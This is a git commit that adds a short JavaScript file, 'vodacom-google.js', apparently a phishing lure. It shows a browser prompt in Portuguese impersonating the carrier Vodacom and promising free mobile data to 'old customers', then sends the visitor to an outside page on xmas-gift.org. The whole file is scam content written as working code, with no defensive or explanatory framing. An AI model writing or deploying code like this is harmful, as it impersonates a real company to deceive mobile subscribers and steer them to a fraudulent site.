c6828d95cbadd3393a1b29429589b78920d12ea8
4g-network <154092422+4g-network@users.noreply.github.com>
2024-10-26 15:04:10 -0700

    Create vodacom-google.js

---
+++ vodacom-google.js
@@ -0,0 +1,6 @@
+
+var password = 'VERIFIQUE AGORA'
+password=prompt('Vodacom: Prezado cliente, por favor verifique se o seu cartão SIM Vodacom está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione VERIFIQUE AGORA para verificar agora ','VERIFIQUE AGORA');
+if (password != 'VERIFIQUE AGORA') {
+location.href='https://xmas-gift.org/vodacom-offer.html';
+}
